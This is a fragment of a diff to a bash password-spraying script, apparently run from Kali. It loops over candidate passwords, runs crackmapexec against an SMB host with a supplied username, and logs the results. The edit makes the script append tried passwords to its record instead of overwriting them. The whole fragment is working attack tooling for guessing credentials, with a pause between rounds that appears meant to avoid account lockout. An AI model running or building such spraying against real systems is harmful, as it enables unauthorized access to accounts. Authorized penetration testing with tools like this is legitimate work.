@@ -25,7 +25,7 @@ while [ $count -gt 0 ]; do
 	for pass in $(cat tmp.txt | head -2); do
 		
 		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log /home/kali/Documents/sprays/spraygun.txt
-		echo $pass > /home/kali/Documents/sprays/used-passwords.txt
+		echo $pass >> /home/kali/Documents/sprays/used-passwords.txt
 
 		sleep 10
 
